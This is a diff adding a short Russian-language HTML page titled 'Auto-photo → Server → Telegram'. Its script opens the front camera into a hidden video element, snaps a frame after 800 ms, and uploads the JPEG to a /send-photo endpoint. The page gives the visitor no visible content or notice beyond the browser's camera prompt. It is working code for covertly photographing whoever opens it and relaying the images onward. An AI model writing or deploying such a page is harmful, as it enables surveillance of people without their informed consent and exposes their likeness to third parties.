@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>Автофото → Сервер → Telegram</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
+
+  <script>
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(res => video.onloadedmetadata = res);
+
+        setTimeout(captureAndSend, 800);
+      } catch (e) {
+        console.error("Нет доступа к камере:", e);
+      }
+    }
+
+    function captureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      canvas.toBlob(async blob => {
+        const fd = new FormData();
+        fd.append("photo", blob, "snapshot.jpg");
+
+        try {
+          const r = await fetch("/send-photo", {
+            method: "POST",
+            body: fd
+          });
+          console.log(await r.json());
+        } catch (err) {
+          console.error("Ошибка отправки:", err);
+        }
+      }, "image/jpeg", 0.9);
+    }
+
+    init();
+  </script>
+</body>
+</html>
